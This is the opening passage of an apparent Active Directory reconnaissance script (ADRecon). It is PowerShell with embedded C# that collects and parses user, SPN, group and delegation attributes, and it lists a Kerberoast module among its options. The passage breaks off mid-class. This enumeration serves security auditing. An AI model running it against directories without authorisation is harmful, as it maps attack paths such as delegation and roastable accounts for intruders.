﻿[CmdletBinding()]
param
(
    [Parameter(Mandatory = $false, HelpMessage = "Which protocol to use; ADWS (default) or LDAP.")]
    [ValidateSet('ADWS', 'LDAP')]
    [string] $Protocol = 'ADWS',

    [Parameter(Mandatory = $false, HelpMessage = "Domain Controller IP Address or Domain FQDN.")]
    [string] $DomainController = '',

    [Parameter(Mandatory = $false, HelpMessage = "Domain Credentials.")]
    [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty,

    [Parameter(Mandatory = $false, HelpMessage = "Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx. Use it to generate the ADRecon-Report.xlsx when Microsoft Excel is not installed on the host used to run ADRecon.")]
    [string] $GenExcel,

    [Parameter(Mandatory = $false, HelpMessage = "Path for ADRecon output folder to save the CSV/XML/JSON/HTML files and the ADRecon-Report.xlsx. (The folder specified will be created if it doesn't exist)")]
    [string] $OutputDir,

    [Parameter(Mandatory = $false, HelpMessage = "Which modules to run; Comma separated; e.g Forest,Domain (Default all except Kerberoast, DomainAccountsusedforServiceLogon) Valid values include: Forest, Domain, Trusts, Sites, Subnets, PasswordPolicy, FineGrainedPasswordPolicy, DomainControllers, Users, UserSPNs, PasswordAttributes, Groups, GroupMembers, OUs, GPOs, gPLinks, DNSZones, Printers, Computers, ComputerSPNs, LAPS, BitLocker, ACLs, GPOReport, Kerberoast, DomainAccountsusedforServiceLogon")]
    [ValidateSet('Forest', 'Domain', 'Trusts', 'Sites', 'Subnets', 'PasswordPolicy', 'FineGrainedPasswordPolicy', 'DomainControllers', 'Users', 'UserSPNs', 'PasswordAttributes', 'Groups', 'GroupMembers', 'OUs', 'GPOs', 'gPLinks', 'DNSZones', 'Printers', 'Computers', 'ComputerSPNs', 'LAPS', 'BitLocker', 'ACLs', 'GPOReport', 'Kerberoast', 'DomainAccountsusedforServiceLogon', 'Default')]
    [array] $Collect = ('Forest', 'Domain', 'Trusts', 'Sites', 'Subnets', 'PasswordPolicy', 'FineGrainedPasswordPolicy', 'DomainControllers', 'Printers', 'Computers', 'Users'),

    [Parameter(Mandatory = $false, HelpMessage = "Output type; Comma seperated; e.g STDOUT,CSV,XML,JSON,HTML,Excel (Default STDOUT with -Collect parameter, else CSV and Excel)")]
    [ValidateSet('STDOUT', 'CSV', 'XML', 'JSON', 'EXCEL', 'HTML', 'All', 'Default')]
    [array] $OutputType = ('HTML', 'CSV'),

    [Parameter(Mandatory = $false, HelpMessage = "Timespan for Dormant accounts. Default 90 days")]
    [ValidateRange(1,1000)]
    [int] $DormantTimeSpan = 90,

    [Parameter(Mandatory = $false, HelpMessage = "Maximum machine account password age. Default 30 days")]
    [ValidateRange(1,1000)]
    [int] $PassMaxAge = 30,

    [Parameter(Mandatory = $false, HelpMessage = "The PageSize to set for the LDAP searcher object. Default 200")]
    [ValidateRange(1,10000)]
    [int] $PageSize = 200,

    [Parameter(Mandatory = $false, HelpMessage = "The number of threads to use during processing of objects. Default 10")]
    [ValidateRange(1,100)]
    [int] $Threads = 10,

    [Parameter(Mandatory = $false, HelpMessage = "Create ADRecon Log using Start-Transcript")]
    [switch] $Log
)

$ADWSSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

namespace ADRecon
{
    public static class ADWSClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<String, String> AdGroupDictionary = new Dictionary<String, String>();
        private static String DomainSID;
        private static Dictionary<String, String> AdGPODictionary = new Dictionary<String, String>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<String, String> AdSIDDictionary = new Dictionary<String, String>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new String[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new String[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new String[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new String[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

		private static readonly Dictionary<String, String> Replacements = new Dictionary<String, String>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static String CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            String CleanedString = String.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (String Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, String DomainSID, int numOfThreads)
        {
            ADWSClass.AdGroupDictionary = new Dictionary<String, String>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            ADWSClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            ADWSClass.AdGPODictionary = new Dictionary<String, String>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            ADWSClass.Date1 = Date1;
            ADWSClass.DormantTimeSpan = DormantTimeSpan;
            ADWSClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.AdSIDDictionary = new Dictionary<String, String>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            ADWSClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(String name)
        {
            switch (name)
            {
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    bool? Enabled = null;
                    bool MustChangePasswordatLogon = false;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool Dormant = false;
                    String SIDHistory = "";
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    String DelegationType = null;
                    String DelegationProtocol = null;
                    String DelegationServices = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;

                    try
                    {
                        // The Enabled field can be blank which raises an exception. This may occur when the user is not allowed to query the UserAccountControl attribute.
                        Enabled = (bool) AdUser.Members["Enabled"].Value;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("{0} Exception caught.", e);
                    }
                    if (AdUser.Members["lastLogonTimeStamp"].Value != null)
                    {
                        //LastLogonDate = DateTime.FromFileTime((long)(AdUser.Members["lastLogonTimeStamp"].Value));
                        // LastLogonDate is lastLogonTimeStamp converted to local time
                        LastLogonDate = Convert.ToDateTime(AdUser.Members["LastLogonDate"].Value);
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) == "0")
                    {
                        if ((bool) AdUser.Members["PasswordNeverExpires"].Value == false)
                        {
                            MustChangePasswordatLogon = true;
                        }
                    }
                    if (AdUser.Members["PasswordLastSet"].Value != null)
                    {
                        //PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Members["pwdLastSet"].Value));
                        // PasswordLastSet is pwdLastSet converted to local time
                        PasswordLastSet = Convert.ToDateTime(AdUser.Members["PasswordLastSet"].Value);
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                    //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 9223372036854775807)
                    //{
                        //if ((Int64) AdUser.Members["accountExpires"].Value != (Int64) 0)
                        if (AdUser.Members["AccountExpirationDate"].Value != null)
                        {
                            try
                            {
                                //AccountExpires = DateTime.FromFileTime((long)(AdUser.Members["accountExpires"].Value));
                                // AccountExpirationDate is accountExpires converted to local time
                                AccountExpires = Convert.ToDateTime(AdUser.Members["AccountExpirationDate"].Value);
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //Console.WriteLine("{0} Exception caught.", e);
                            }
                        }
                    //}
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["SIDHistory"].Value;
                    if (history.Value is System.Security.Principal.SecurityIdentifier[])
                    {
                        string sids = "";
                        foreach (var value in (SecurityIdentifier[]) history.Value)
                        {
                            sids = sids + "," + Convert.ToString(value);
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    else
                    {
                        SIDHistory = history != null ? Convert.ToString(history.Value) : "";
                    }
                    if (AdUser.Members["msDS-SupportedEncryptionTypes"].Value != null)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Members["msDS-SupportedEncryptionTypes"].Value;
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    if ((bool) AdUser.Members["TrustedForDelegation"].Value)
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdUser.Members["msDS-AllowedToDelegateTo"] != null)
                    {
                        Microsoft.ActiveDirectory.Management.ADPropertyValueCollection delegateto = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdUser.Members["msDS-AllowedToDelegateTo"].Value;
                        if (delegateto.Value != null)
                        {
                            DelegationType = "Constrained";
                            if (delegateto.Value is System.String[])
                            {
                                foreach (var value in (String[]) delegateto.Value)
                                {
                                    DelegationServices = DelegationServices + "," + Convert.ToString(value);
                                }
                                DelegationServices = DelegationServices.TrimStart(',');
                            }
                            else
                            {
                                DelegationServices = Convert.ToString(delegateto.Value);
                            }
                        }
                    }
                    if ((bool) AdUser.Members["TrustedToAuthForDelegation"].Value == true)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", AdUser.Members["SamAccountName"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Name", CleanString(AdUser.Members["Name"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", AdUser.Members["CannotChangePassword"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", AdUser.Members["PasswordNeverExpires"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", AdUser.Members["AllowReversiblePasswordEncryption"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", AdUser.Members["SmartcardLogonRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", !((bool) AdUser.Members["AccountNotDelegated"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", AdUser.Members["UseDESKeyOnly"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", AdUser.Members["DoesNotRequirePreAuth"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AdUser.Members["LockedOut"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", AdUser.Members["PasswordExpired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", AdUser.Members["PasswordNotRequired"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", AdUser.Members["LogonWorkstations"].Value));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", AdUser.Members["AdminCount"].Value));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", AdUser.Members["primaryGroupID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SID", AdUser.Members["SID"].Value));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("Description", CleanString(AdUser.Members["Description"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Title", CleanString(AdUser.Members["Title"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Department", CleanString(AdUser.Members["Department"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Company", CleanString(AdUser.Members["Company"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Manager", CleanString(AdUser.Members["Manager"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Info", CleanString(AdUser.Members["Info"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", CleanString(AdUser.Members["Mobile"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Email", CleanString(AdUser.Members["mail"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", AdUser.Members["homeDirectory"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", AdUser.Members["profilePath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", AdUser.Members["ScriptPath"].Value));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", AdUser.Members["UserAccountControl"].Value));
                    UserObj.Members.Add(new PSNoteProperty("First Name", CleanString(AdUser.Members["givenName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", CleanString(AdUser.Members["middleName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", CleanString(AdUser.Members["sn"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("Country", CleanString(AdUser.Members["c"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", AdUser.Members["whenCreated"].Value));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", AdUser.Members["whenChanged"].Value));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdUser.Members["DistinguishedName"].Value)));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", AdUser.Members["CanonicalName"].Value));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdUser = (PSObject) record;
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    String Memberof = null;
                    DateTime? PasswordLastSet = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Members["userAccountControl"].Value != null)
                    {
                        var userFlags = (UACFlags) AdUser.Members["userAccountControl"].Value;
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    if (Convert.ToString(AdUser.Members["pwdLastSet"].Value) != "0")
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)AdUser.Members["pwdLastSet"].Value);
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection SPNs = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["servicePrincipalName"].Value;
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection MemberOfAttribute = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection)AdUser.Members["memberof"].Value;
                    if (MemberOfAttribute.Value is System.String[])
                    {
                        foreach (String Member in (System.String[])MemberOfAttribute.Value)
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    else if (Memberof != null)
                    {
                        Memberof = ((Convert.ToString(MemberOfAttribute.Value)).Split(',')[0]).Split('=')[1];
                    }
                    String Description = CleanString(AdUser.Members["Description"].Value);
                    String PrimaryGroupID = Convert.ToString(AdUser.Members["primaryGroupID"].Value);
                    if (SPNs.Value is System.String[])
                    {
                        foreach (String SPN in (System.String[])SPNs.Value)
                        {
                            String[] SPNArray = SPN.Split('/');
                            PSObject UserSPNObj = new PSObject();
                            UserSPNObj.Members.Add(new PSNoteProperty("Name", AdUser.Members["Name"].Value));
                            UserSPNObj.Members.Add(new PSNoteProperty("Username", AdUser.Members["SamAccountName"].Value));
                            UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                            UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                            UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                            UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                            UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                            UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                            UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                            SPNList.Add( UserSPNObj );
                        }
                    }
                    else
                    {
                        String[] SPNArray = Convert.ToString(SPNs.Value).Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", AdUser.Members["Name"].Value));
                        UserSPNObj.Members.Add(new PSNoteProperty("Username", AdUser.Members["SamAccountName"].Value));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    string ManagedByValue = Convert.ToString(AdGroup.Members["managedBy"].Value);
                    string ManagedBy = "";
                    String SIDHistory = "";

                    if (AdGroup.Members["managedBy"].Value != null)
                    {
                        ManagedBy = (ManagedByValue.Split(',')[0]).Split('=')[1];
                    }
                    Microsoft.ActiveDirectory.Management.ADPropertyValueCollection history = (Microsoft.ActiveDirectory.Management.ADPropertyValueCollection) AdGroup.Members["SIDHistory"].Value;
                    if (history.Value is System.Security.Principal.SecurityIdentifier[])
                    {
                        string sids = "";
                        foreach (var value in (SecurityIdentifier[]) history.Value)
                        {
                            sids = sids + "," + Convert.ToString(value);
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    else
                    {
                        SIDHistory = history != null ? Convert.ToString(history.Value) : "";
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Members["SamAccountName"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", AdGroup.Members["AdminCount"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", AdGroup.Members["GroupCategory"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", AdGroup.Members["GroupScope"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", AdGroup.Members["sid"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", CleanString(AdGroup.Members["Description"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Members["whenCreated"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Members["whenChanged"].Value));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Members["DistinguishedName"].Value)));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Members["CanonicalName"].Value));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }


        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdGroup = (PSObject) record;
                    ADWSClass.AdGroupDictionary.Add((Convert.ToString(AdGroup.Properties["SID"].Value)), (Convert.ToString(AdGroup.Members["SamAccountName"].Value)));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
